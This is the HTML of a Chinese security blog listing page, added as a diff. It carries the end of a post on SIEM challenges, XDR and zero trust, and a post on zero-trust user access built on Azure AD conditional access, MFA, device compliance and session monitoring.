+2. 安全操作， 可用于不同的威胁检测和响应用例
+3. 安全集成，充当其它安全应用的集成平台，如UEBA、SOAR等
+4. 可见性，为整个组织的事件数据提供可见性、合规性和报告
+5. …
+</code></pre>
+<p>SIEM面临的最大挑战：</p>
+<pre><code>1. 软件授权昂贵
+2. 维护和运营SIEM基础设施的成本很高，且需要很多资源和时间
+3. SIEM可以有效的检测已知威胁，但是对于未知威胁却不太有效
+4. SIEM更适合有经验的网络安全分析师使用
+5. SIEM基础设施部署需要复杂而漫长的部署周期
+6. …
+</code></pre>
+<p>XDR与零信任</p>
+<p>XDR 可以发挥关键作用，充当集成端到端零信任架构的中枢神经系统， 它在整个网络和环境中提供实时可见性和警报，监控核心策略的执行，提供上下文洞察力，并授权团队在需要时采取快速行动。</p>
+<p>XDR的风险：</p>
+<pre><code>就目前而言，XDR仍是一个新兴的待验证的安全产品，大量的优势仍然存在某些特定案例或者PPT上。
+</code></pre>
+<p>SOAPA(    security operations and analytics platform architecture)</p>
+<p>一个为规模、集成、高级分析和过程自动化而构建的架构。（ESG提出）</p>
+<p><img lazyload src="/images/loading.svg" data-src="5.png"></p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Fri May 27 2022 21:00:00 GMT+0800">2022-05-27</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/">安全建设</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/THINK/">THINK</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/%E5%85%B3%E4%BA%8EXDR%E7%9A%84%E4%B8%80%E7%82%B9%E7%AC%94%E8%AE%B0/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/%E9%9B%B6%E4%BF%A1%E4%BB%BB%E4%B8%8B%E7%9A%84%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE/">
+                        零信任下的用户访问
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        
+
+用户访问通常是零信任的第一要务，因为它可以迅速带来生产力优势和关键漏洞的安全覆盖
+
+
+
+使用户能够在任何地方高效工作并确保安全需要使用高质量信号明确验证用户和设备的风险/可信度。
+  
+用户风险
+衡量用户风险需要分析账户本身的风险、当前的访问请求会话，以及他们是否使用了 MFA：
+•用户/会话风险- Azure Active Directory (Azure AD) 身份保护分析用户帐户和当前访问请求，为 Azure AD 条件访问提供高/中/低风险等级。 此评级由机器学习计算确定，涉及众多个人风险因素，包括泄露的凭据、非典型旅行、恶意 IP 地址、恶意软件链接的 IP 地址和可疑的收件箱操纵规则
+•多因素身份验证 (MFA) - MFA 是合理的安全保证所必需的，因为攻击者可以（很容易）通过被盗或猜测的密码冒充受纯密码身份验证保护的帐户。
+  
+设备风险
+设备风险是通过明确验证它是否符合组织的策略来衡量的，其中可以包括验证从已安装的端点检测和响应 (EDR) 功能中未检测到恶意活动。  •IsCompliant - Microsoft Endpoint Management Intune 提供对设备安全策略的管理，该策略评估来自 Intune 托管客户端、Microsoft Defender for Endpoint 和合作伙伴 MDM 的信号
+•设备属性 - 条件访问可以过滤策略，因此它们需要特定的设备属性（例如，识别高度安全的特权访问工作站或 PAW）。
+  
+政策评估与MFA
+
+Azure AD 条件访问会根据您配置的策略评估这些信号。 静态策略和动态实时信息（威胁情报、会话上下文等）的这种组合提供了一种自适应方法来管理风险，这种方法既一致又通过不断变化的现实世界条件提供信息。  •初始访问+令牌刷新——对于所有使用条件访问的应用程序，策略验证发生在每次访问请求时+刷新令牌以延长到期时间时。
+• 安全态势的变化——此外，条件访问支持持续访问评估 (CAE)，以近乎实时地对不断变化的风险条件（例如网络位置更改、用户终止或潜在的凭据盗窃事件）提供更快的响应。
+  
+高风险的补救  
+如果用户/会话风险被评为高（表明凭据可能/已知被泄露），您可以将用户配置为自动重定向到自助服务密码重置 (SSPR) 站点以立即更改其密码。
+  
+首次集成（Microsoft 应用程序和第 3 方 VPN 和网络设备）
+
+在明确验证用户/会话和设备风险足够低后，授予访问资源的访问权限。  最初的集成通常是：
+•Microsoft 应用程序，因为这些云应用程序本身就支持 Azure AD 和条件访问。
+• 第三方 VPN 和远程访问设备 - 快速提高远程访问应用程序和网络的安全性，以实现远程和混合工作场景。 这可以快速添加复杂的用户和设备风险验证身份验证，从而降低常见的密码和设备风险。
+  
+启用您的企业资产  接下来，将扩展到跨云、移动和本地应用程序的企业应用程序的全部资产。
+  
+遗留应用程序和会话监控
+Azure AD 应用程序代理提供发布传统本地应用程序的能力，以利用这些强大的保证（并简化用户体验），帮助你超越 VPN。  Microsoft Defender for Cloud Apps（条件访问应用控制）还启用了会话监控和限制。 可以根据来自条件访问的信号和会话中的其他 MDCA 检测来监控会话并使用会话策略限制功能，包括：
+•防止数据泄露•保护下载•防止上传未标记的文件•监控用户会话以确保合规性•阻止访问•阻止自定义活动
+•较低的访问权限 - 可以使用本机应用程序功能（如下载、打印或同步文件的 SharePoint 网站限制）限制对应用程序或其中数据的访问 。
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <blockquote>
+<blockquote>
+<p>用户访问通常是零信任的第一要务，因为它可以迅速带来生产力优势和关键漏洞的安全覆盖</p>
+</blockquote>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="1.png"></p>
+<p>使用户能够在任何地方高效工作并确保安全需要使用高质量信号明确验证用户和设备的风险/可信度。
+  </p>
+<h2 id="用户风险"><a href="#用户风险" class="headerlink" title="用户风险"></a>用户风险</h2><p><img lazyload src="/images/loading.svg" data-src="2.png"></p>
+<p>衡量用户风险需要分析账户本身的风险、当前的访问请求会话，以及他们是否使用了 MFA：</p>
+<p>•用户/会话风险- Azure Active Directory (Azure AD) 身份保护分析用户帐户和当前访问请求，为 Azure AD 条件访问提供高/中/低风险等级。 此评级由机器学习计算确定，涉及众多个人风险因素，包括泄露的凭据、非典型旅行、恶意 IP 地址、恶意软件链接的 IP 地址和可疑的收件箱操纵规则</p>
+<p>•多因素身份验证 (MFA) - MFA 是合理的安全保证所必需的，因为攻击者可以（很容易）通过被盗或猜测的密码冒充受纯密码身份验证保护的帐户。
+  </p>
+<h2 id="设备风险"><a href="#设备风险" class="headerlink" title="设备风险"></a>设备风险</h2><p><img lazyload src="/images/loading.svg" data-src="3.png"></p>
+<p>设备风险是通过明确验证它是否符合组织的策略来衡量的，其中可以包括验证从已安装的端点检测和响应 (EDR) 功能中未检测到恶意活动。<br>  <br>•IsCompliant - Microsoft Endpoint Management Intune 提供对设备安全策略的管理，该策略评估来自 Intune 托管客户端、Microsoft Defender for Endpoint 和合作伙伴 MDM 的信号</p>
+<p>•设备属性 - 条件访问可以过滤策略，因此它们需要特定的设备属性（例如，识别高度安全的特权访问工作站或 PAW）。</p>
+<p>  </p>
+<h2 id="政策评估与MFA"><a href="#政策评估与MFA" class="headerlink" title="政策评估与MFA"></a>政策评估与MFA</h2><p><img lazyload src="/images/loading.svg" data-src="4.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="5.png"></p>
+<p>Azure AD 条件访问会根据您配置的策略评估这些信号。 静态策略和动态实时信息（威胁情报、会话上下文等）的这种组合提供了一种自适应方法来管理风险，这种方法既一致又通过不断变化的现实世界条件提供信息。<br>  <br>•初始访问+令牌刷新——对于所有使用条件访问的应用程序，策略验证发生在每次访问请求时+刷新令牌以延长到期时间时。</p>
+<p>• 安全态势的变化——此外，条件访问支持持续访问评估 (CAE)，以近乎实时地对不断变化的风险条件（例如网络位置更改、用户终止或潜在的凭据盗窃事件）提供更快的响应。
+  </p>
+<h2 id="高风险的补救"><a href="#高风险的补救" class="headerlink" title="高风险的补救"></a>高风险的补救</h2><p>  <br><img lazyload src="/images/loading.svg" data-src="6.png"></p>
+<p>如果用户/会话风险被评为高（表明凭据可能/已知被泄露），您可以将用户配置为自动重定向到自助服务密码重置 (SSPR) 站点以立即更改其密码。
+  </p>
+<h2 id="首次集成（Microsoft-应用程序和第-3-方-VPN-和网络设备）"><a href="#首次集成（Microsoft-应用程序和第-3-方-VPN-和网络设备）" class="headerlink" title="首次集成（Microsoft 应用程序和第 3 方 VPN 和网络设备）"></a>首次集成（Microsoft 应用程序和第 3 方 VPN 和网络设备）</h2><p><img lazyload src="/images/loading.svg" data-src="7.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="8.png"></p>
+<p>在明确验证用户/会话和设备风险足够低后，授予访问资源的访问权限。<br>  <br>最初的集成通常是：</p>
+<p>•Microsoft 应用程序，因为这些云应用程序本身就支持 Azure AD 和条件访问。</p>
+<p>• 第三方 VPN 和远程访问设备 - 快速提高远程访问应用程序和网络的安全性，以实现远程和混合工作场景。 这可以快速添加复杂的用户和设备风险验证身份验证，从而降低常见的密码和设备风险。
+  </p>
+<h2 id="启用您的企业资产"><a href="#启用您的企业资产" class="headerlink" title="启用您的企业资产"></a>启用您的企业资产</h2><p><img lazyload src="/images/loading.svg" data-src="9.png"><br>  <br>接下来，将扩展到跨云、移动和本地应用程序的企业应用程序的全部资产。
+  </p>
+<h2 id="遗留应用程序和会话监控"><a href="#遗留应用程序和会话监控" class="headerlink" title="遗留应用程序和会话监控"></a>遗留应用程序和会话监控</h2><p><img lazyload src="/images/loading.svg" data-src="10.png"></p>
+<p>Azure AD 应用程序代理提供发布传统本地应用程序的能力，以利用这些强大的保证（并简化用户体验），帮助你超越 VPN。<br>  <br>Microsoft Defender for Cloud Apps（条件访问应用控制）还启用了会话监控和限制。 可以根据来自条件访问的信号和会话中的其他 MDCA 检测来监控会话并使用会话策略限制功能，包括：</p>
+<p>•防止数据泄露<br>•保护下载<br>•防止上传未标记的文件<br>•监控用户会话以确保合规性<br>•阻止访问<br>•阻止自定义活动</p>
+<p>•较低的访问权限 - 可以使用本机应用程序功能（如下载、打印或同步文件的 SharePoint 网站限制）限制对应用程序或其中数据的访问 。</p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Wed May 18 2022 21:00:00 GMT+0800">2022-05-18</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/">安全架构</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/">安全建设</a>&nbsp;
+                        </li>
+                    
+                        <li>
+                            | 
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%BD%93%E7%B3%BB%E5%8F%82%E8%80%83/">网络安全架构体系参考</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/%E9%9B%B6%E4%BF%A1%E4%BB%BB%E4%B8%8B%E7%9A%84%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+    </ul>
+
+    <div class="home-paginator">
+        <div class="paginator">
+    
+        <a class="prev btn"
+           href="/page/2/"
+        >Prev</a>
+    
+
+    
+        <a class="next btn"
+           href="/page/4/"
+        >Next</a>
+    
+</div>
+
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>&nbsp;-&nbsp;
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a target="_blank" rel="noopener" href="//langu.xyz">AboutME:langu_xyz</a>
+        </div>
+        <!--
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        -->
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+<div class="post-scripts pjax">
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
